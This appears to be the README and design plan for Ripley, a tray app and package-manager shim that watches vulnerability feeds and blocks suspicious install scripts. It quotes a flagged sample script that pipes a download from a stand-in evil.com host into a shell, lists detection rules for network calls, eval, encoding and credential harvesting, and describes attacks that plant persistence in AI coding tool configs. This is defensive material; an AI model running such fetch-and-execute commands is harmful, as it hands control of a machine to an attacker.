# Ripley

**Supply chain defense that operates before the breach, not after it.**

Ripley is a cross-platform system tray application and package manager guardian that
detects software supply chain attacks in real time, alerts developers before they are
affected, and intercepts malicious install scripts before they execute.

Named after Ellen Ripley --- the one who detected the threat hiding inside something
everyone trusted, when every system around her failed to.

---

## Background

In a single two-week window (late April through May 11, 2026), the software industry
experienced an unprecedented concentration of supply chain attacks:

- **TanStack Router** (May 11) --- 42 npm packages compromised via GitHub Actions cache
  poisoning. A self-propagating worm harvested credentials from 100+ file paths, injected
  persistence into Claude Code and VS Code configs, and exfiltrated data through encrypted
  P2P channels. Detected by external researchers within 6 minutes, but the blast radius was
  84 malicious package versions with millions of collective downloads.

- **Mini Shai-Hulud / TeamPCP** --- A coordinated campaign that hit SAP's npm packages
  (~572K weekly downloads), PyTorch Lightning on PyPI, Bitwarden CLI, Mistral AI SDKs,
  Checkmarx Docker images, Checkmarx Jenkins plugin, Telnyx SDK, and 200+ other package
  artifacts across five ecosystems. The worm self-propagated by stealing npm tokens and
  republishing poisoned versions of every package a victim could access.

- **Axios** (March 31) --- The HTTP client with ~100M weekly downloads shipped a
  cross-platform RAT through two backdoored releases. Exposure window: 3 hours.

- **elementary-data** (April 24) --- PyPI package with ~1.1M monthly downloads compromised
  via GitHub Actions script injection. A `.pth` file executed on every Python invocation,
  not just on import --- stealing SSH keys, cloud credentials, and wallet keys.

- **JDownloader** (May 6-7) --- Website CMS compromised, installers replaced with a
  Pyarmor-obfuscated Python RAT. Linux variant installed SUID-root binaries.

- **DAEMON Tools** (April 8 - May) --- Signed Windows installer trojaned by a
  Chinese-speaking threat actor. Multi-stage backdoor with C2 over HTTP, UDP, TCP, WSS,
  QUIC, DNS, and HTTP/3.

- **GlassWorm v2** --- 73 fake VS Code extensions on Open VSX. Zig-based droppers capable
  of infecting every IDE on a developer's machine.

- **QLNX** --- A fileless Linux RAT with rootkit, PAM backdoor, eBPF process hiding, and
  seven persistence methods, specifically targeting developer credential stores.

This is not an anomaly. It is the new baseline. The supply chain is now the primary attack
surface for software development, and the pace of attacks has outstripped the industry's
ability to respond.


## The Gap

The current security toolchain is almost entirely **reactive**. It operates after the
breach:

| Tool | When it helps | The problem |
|------|---------------|-------------|
| `npm audit` | After install | Advisory must exist first. Tells you *after* you already ran the malicious postinstall script. |
| CVE databases | After disclosure | Median time from compromise to CVE: days to weeks. Attackers have already moved. |
| GitHub Dependabot | After advisory | Opens a PR. Doesn't stop you from installing the bad version right now. |
| Security blogs | After analysis | You learn about it from Twitter or Hacker News hours or days later. |
| Incident response | After compromise | Credential rotation, forensics, OS reinstall. The damage is done. |

The pattern across every attack listed above: the malicious code **executed on developer
machines** before any defensive tool flagged it. The npm postinstall script ran. The Python
`.pth` file loaded. The Docker entrypoint fired. By the time an advisory existed, the
credentials were already exfiltrated.

There is a gap between "a malicious package is published" and "a developer installs it"
where almost no tooling operates.


## Forward Defense

Most security discussion focuses on **post-compromise response**: detecting that you were
hit, rotating credentials, rebuilding from clean state. This is necessary work, but it
concedes the initiative to the attacker. You are always behind.

Ripley is built around a different posture: **forward defense**. Operating ahead of the
threat, not behind it.

The term draws from two traditions:

- **Forward secrecy** in cryptography, where compromise of current keys does not compromise
  past or future sessions. The system is designed so that security holds *going forward*
  regardless of what is breached today.

- **Left of boom** in military doctrine, where effort concentrates on the period *before*
  the detonation event. "Boom" in our context is the moment a malicious install script
  executes on your machine, or a trojaned package gets imported into your runtime.

Forward defense means three things for Ripley:

### 1. Threat awareness before exposure

Polling structured vulnerability feeds (OSV.dev, GitHub Advisory Database, Socket.dev) on a
continuous loop and cross-referencing against every lockfile on your machine. You learn that
a package you depend on was compromised *before* your next `npm install`, not after it.

### 2. Interception before execution

Package manager install scripts (`preinstall`, `postinstall`, `prepare` in npm; `setup.py`
in pip; build scripts in cargo) are the primary entry point for supply chain malware. Ripley
intercepts these scripts and analyzes them before they run. If a `postinstall` script
downloads a binary, decodes base64, shells out to curl, or exhibits obfuscation patterns, it
is flagged and blocked --- not logged after the fact.

### 3. Remediation at machine speed

When a threat is confirmed, Ripley generates a scoped remediation prompt and hands it to
whichever AI coding harness the developer uses (Claude Code, Codex, OpenCode). The prompt
includes the specific CVE, the affected package and version, the project path, known IOC
file paths to check, and the clean version to upgrade to. The harness executes the fix. The
developer reviews and approves.

This shifts the response timeline from "read a blog post, understand the threat, manually
audit your projects, figure out what to do" (hours to days) to "notification, one click,
review diff" (minutes).

### The goal

A developer should never learn about a supply chain attack from Twitter. They should learn
about it from Ripley, before it affects them, with a fix ready to apply.


## Architecture

```
                     ┌──────────────────────────────┐
                     │        ripley (tray app)      │
                     │                              │
                     │  ┌────────┐   ┌───────────┐  │
     OSV.dev ───────►│  │  Feed  │   │  Lockfile  │  │
     GHSA ──────────►│  │ Poller │──►│  Matcher   │  │
     Socket.dev ────►│  │        │   │            │  │
                     │  └────────┘   └─────┬──────┘  │
                     │                     │         │
                     │               match?│         │
                     │                     ▼         │
                     │  ┌──────────────────────────┐ │
                     │  │  Native OS Notification  │ │
                     │  │  [View] [Fix] [Dismiss]  │ │
                     │  └───────────┬──────────────┘ │
                     │              │ "Fix"          │
                     │              ▼                │
                     │  ┌──────────────────────────┐ │
                     │  │   Prompt Generator       │ │
                     │  │   ┌──────────────────┐   │ │
                     │  │   │ CVE + versions   │   │ │
                     │  │   │ project path     │   │ │
                     │  │   │ IOC file paths   │   │ │
                     │  │   │ clean version    │   │ │
                     │  │   │ test command     │   │ │
                     │  │   └──────────────────┘   │ │
                     │  └───────────┬──────────────┘ │
                     │              │                │
                     │              ▼                │
                     │  ┌──────────────────────────┐ │
                     │  │   Harness Launcher       │ │
                     │  │   claude | codex | open  │ │
                     │  └──────────────────────────┘ │
                     └──────────────────────────────┘

                     ┌──────────────────────────────┐
                     │    ripley-guard (CLI shim)    │
                     │                              │
  npm install ──────►│  ┌──────────────────────────┐ │
  pip install ──────►│  │   Script Extractor       │ │
  cargo build ──────►│  │   (fetch tarball, parse  │ │
  gem install ──────►│  │    lifecycle hooks)       │ │
  go install ───────►│  └───────────┬──────────────┘ │
                     │              │                │
                     │              ▼                │
                     │  ┌──────────────────────────┐ │
                     │  │   Static Analyzer        │ │
                     │  │                          │ │
                     │  │   network calls?    ──► ■ │ │
                     │  │   eval / exec?     ──► ■ │ │
                     │  │   base64 decode?   ──► ■ │ │
                     │  │   binary download? ──► ■ │ │
                     │  │   obfuscation?     ──► ■ │ │
                     │  │   known patterns?  ──► ■ │ │
                     │  │                          │ │
                     │  │   risk: low | med | high │ │
                     │  └───────────┬──────────────┘ │
                     │              │                │
                     │         low  │  med/high      │
                     │         ┌────┴────┐           │
                     │         ▼         ▼           │
                     │    auto-allow   prompt user   │
                     │                 with details  │
                     └──────────────────────────────┘
```

### Component 1: `ripley` --- the tray app

Built with [Tauri](https://tauri.app) (Rust backend, native webview). Produces a ~5MB
binary on each platform versus ~200MB for Electron. Ships as a single install.

**Feed poller.** Hits three structured APIs on a configurable interval (default: 5 minutes):
- [OSV.dev](https://osv.dev) --- Google's aggregated vulnerability database. Covers npm,
  PyPI, crates.io, Go, RubyGems, Packagist, NuGet, Maven. Structured JSON with affected
  version ranges.
- [GitHub Advisory Database](https://github.com/advisories) --- GHSA advisories via the
  GraphQL API. Feeds `npm audit` and `pip audit` under the hood.
- [Socket.dev](https://socket.dev) --- Detected the TanStack compromise in 6 minutes.
  Offers an API for real-time malicious package alerts.

Each feed item is normalized to: `(ecosystem, package, affected_versions, severity, cve,
description, iocs)`.

**Lockfile indexer.** On startup, walks configured project roots and indexes every lockfile
it finds. Watches for filesystem changes via FSEvents (macOS), inotify (Linux), or
ReadDirectoryChangesW (Windows) using the `notify` Rust crate. Maintains an in-memory map
of `(ecosystem, package, installed_version)` tuples across all projects.

**Matcher.** When a new feed item arrives, queries the lockfile index. If any installed
version falls within the affected range, the item is promoted to an alert.

**Notifier.** Fires a native OS notification. On macOS: UNUserNotificationCenter. On
Windows: toast via the Windows notification API. On Linux: D-Bus
`org.freedesktop.Notifications`. Tauri abstracts this. The notification carries three
actions:
- **View** --- opens a detail panel in the tray app with the full advisory, affected
  projects, IOC checklist.
- **Fix** --- generates a remediation prompt and offers to run it on an AI coding harness.
- **Dismiss** --- acknowledges the alert.

**Prompt generator.** Builds a self-contained remediation prompt from the advisory data:

```
In the project at /Users/jack/src/myapp, the package @tanstack/react-router
is installed at version 1.169.5, which is compromised (CVE-2026-45321).

1. Update to the latest clean version.
2. Check for these IOC files and remove them if present:
   - .claude/execution.js
   - .claude/setup.mjs
   - .vscode/setup.mjs
   - node_modules/@tanstack/*/router_init.js
3. Run the test suite and verify the build passes.
4. Report what you found and what you changed.
```

**Harness launcher.** Detects available AI coding CLIs in PATH order: `claude`, `codex`,
`opencode`. User can set a preference. Spawns the harness in a new terminal window with the
generated prompt. The developer stays in control --- they review the diff before committing.

### Component 2: `ripley-guard` --- the package manager interceptor

A standalone Rust binary, separate from the tray app. Runs without a GUI. Can be used in CI.

**Installation.**

```
ripley guard install
```

This prepends `~/.ripley/bin/` to PATH (via shell RC file) and places shims for each
supported package manager. The shims delegate to the real binary after analysis. For npm
specifically, it can alternatively set `ignore-scripts=true` in `.npmrc` and manage script
execution itself.

**Script extraction.** Before running any install, the guard:
1. Resolves the package and version from the registry.
2. Fetches the tarball (or reads from cache).
3. Extracts lifecycle scripts from `package.json` (`preinstall`, `install`, `postinstall`,
   `prepare`, `prepack`), `setup.py`, `pyproject.toml` build backends, etc.
4. If the script references other files, extracts those too.

**Static analysis.** Each script is analyzed against a rule engine:

| Signal | Weight | Example |
|--------|--------|---------|
| Network call | High | `curl`, `wget`, `fetch()`, `http.get`, `net.connect` |
| Code generation | High | `eval()`, `Function()`, `new Function`, `vm.runInContext` |
| Encoding/obfuscation | High | `base64`, `Buffer.from`, `atob`, `String.fromCharCode` |
| Binary execution | Critical | Downloading and executing `.exe`, `.sh`, ELF binaries |
| Shell spawning | High | `child_process.exec`, `subprocess.run`, `os.system` |
| Environment harvesting | Medium | Bulk `process.env` access, reading `.env` files |
| File system scope escape | Medium | Writing outside the package directory |
| Known malicious patterns | Critical | Bun runtime smuggling, `.claude/settings.json` injection |
| Obfuscation tools | Critical | javascript-obfuscator markers, Pyarmor headers |
| Script size anomaly | Medium | postinstall script > 100KB (legitimate ones are rarely large) |

Scripts scoring below threshold auto-approve. Scripts above threshold present the developer
with a highlighted view of the suspicious code and ask for confirmation:

```
ripley-guard: @example/pkg@1.2.3 postinstall script flagged (risk: high)

  #!/bin/sh
  curl -s https://evil.com/payload.sh | sh    ← network call + pipe to shell

  [allow] [block] [inspect] [always trust @example/pkg]
```

**Trust management.** Developers can trust specific packages, publishers, or scopes. Trusted
packages bypass analysis. The trust list is local and explicit --- Ripley never auto-trusts.

**CI mode.** In CI environments (`CI=true`), the guard runs non-interactively. High-risk
scripts fail the build. Configuration via `.ripley.toml` in the project root:

```toml
[guard]
mode = "strict"  # "strict" blocks high-risk, "audit" logs only, "off" disables
trust = ["@tanstack/*", "typescript", "esbuild"]
```


## Technical Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Language | Rust | Both the tray app and guard need to be fast, dependency-free, and cross-platform. The guard runs on every `npm install` --- it must add < 200ms latency. |
| Tray framework | Tauri v2 | Native webview, ~5MB binary, ships on macOS/Windows/Linux. Avoids bundling Chromium. |
| Data source | OSV.dev primary | Free, open, structured, aggregates all ecosystems. No API key required. |
| Script analysis | Static rules | Fast, deterministic, no ML false positives. Rule engine is extensible. Known patterns (from real attacks) are more reliable than heuristics. |
| Lockfile format | Parse directly | Don't depend on package managers to report their own state. Read `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, etc. directly. |
| Filesystem watching | `notify` crate | Cross-platform abstraction over FSEvents/inotify/ReadDirectoryChanges. Re-indexes lockfiles on change. |
| Harness integration | CLI spawning | No deep integration with any specific harness. Spawn `claude -p`, `codex -q`, or equivalent. Works with whatever the developer has installed. Harness-agnostic. |
| Trust model | Explicit, local | No remote trust authority. Developer opts in to trusting packages. Default is verify everything. |


## Threat Model

Ripley defends against:

- **Malicious lifecycle scripts** --- postinstall scripts that download and execute
  payloads, exfiltrate credentials, or establish persistence. (Mini Shai-Hulud, Axios, SAP
  packages)
- **Compromised legitimate packages** --- trusted packages where a maintainer's credentials
  are stolen and a malicious version is published. (TanStack, Bitwarden CLI, elementary-data)
- **Typosquatting** --- packages with names similar to popular ones. (BufferZoneCorp,
  fake `tanstack` brand-squat)
- **Delayed activation** --- "sleeper" packages that ship clean initially and add malicious
  code in a later update. (BufferZoneCorp Ruby gems)
- **AI tool persistence** --- attacks that inject `.claude/settings.json` SessionStart
  hooks or `.vscode/tasks.json` runOn triggers to re-execute on IDE/tool open. (Mini
  Shai-Hulud)

Ripley does **not** defend against:

- **Compromised compilers or OS-level toolchains** --- Ripley trusts the Rust toolchain it's
  built with and the OS it runs on.
- **Zero-day vulnerabilities in legitimate code** --- Ripley is not a SAST tool. It detects
  malicious intent in install scripts and known compromised versions, not bugs.
- **Attacks that don't use package managers** --- direct binary downloads, manual curl-pipe-
  bash, browser drive-by. Different threat, different tool.
- **Insider threats** --- a developer intentionally installing malicious code.


## CLI

```
ripley                              # launch the tray app
ripley scan [path]                  # one-shot scan: check lockfiles against advisories
ripley watch                        # headless daemon mode (servers, CI)
ripley config                       # open configuration
ripley status                       # show monitored projects, last poll time, alert count

ripley guard install                # set up package manager shims in PATH
ripley guard uninstall              # remove shims, restore original behavior
ripley guard status                 # show which package managers are intercepted
ripley guard trust <pkg>            # add a package to the trust list
ripley guard untrust <pkg>          # remove from trust list
ripley guard log                    # show recent interceptions and decisions
```


## Roadmap

### Phase 1: Foundation
- Rust workspace with `ripley` (tray) and `ripley-guard` (CLI) crates
- OSV.dev feed poller + lockfile parser for `package-lock.json`
- npm shim with static script analysis
- macOS tray app with native notifications
- `ripley scan` one-shot command

### Phase 2: Ecosystem breadth
- Lockfile parsers: `yarn.lock`, `pnpm-lock.yaml`, `Pipfile.lock`, `poetry.lock`,
  `Cargo.lock`, `go.sum`, `Gemfile.lock`
- Guard shims: pip, cargo, gem, go
- GHSA and Socket.dev feed integration
- Windows and Linux tray builds

### Phase 3: AI harness integration
- Prompt generation from advisory data
- Harness detection and launcher (Claude Code, Codex, OpenCode)
- "Fix" action in notifications
- Remediation templates for common attack patterns

### Phase 4: Advanced analysis
- Sandboxed script execution (macOS sandbox-exec, Linux bubblewrap)
- Behavioral analysis: run script with network disabled, observe filesystem/process activity
- Community rule sharing: publish and subscribe to detection rules
- CI/CD integration: GitHub Action, GitLab CI template


## Why "Ripley"

Ellen Ripley detected the threat hiding inside something everyone else trusted. The company
(Weyland-Yutani) prioritized other goals. The systems around her failed. She survived
because she verified things herself, acted before the threat could spread, and protected
others when institutions wouldn't.

Software supply chains have the same structure. Package registries prioritize growth and
convenience. The threat hides inside things that look safe --- a routine dependency update, a
trusted package name, a familiar postinstall script. The systems we rely on (npm audit, CVE
databases, security advisories) operate after the threat has already executed.

Ripley operates before.


## License

TBD
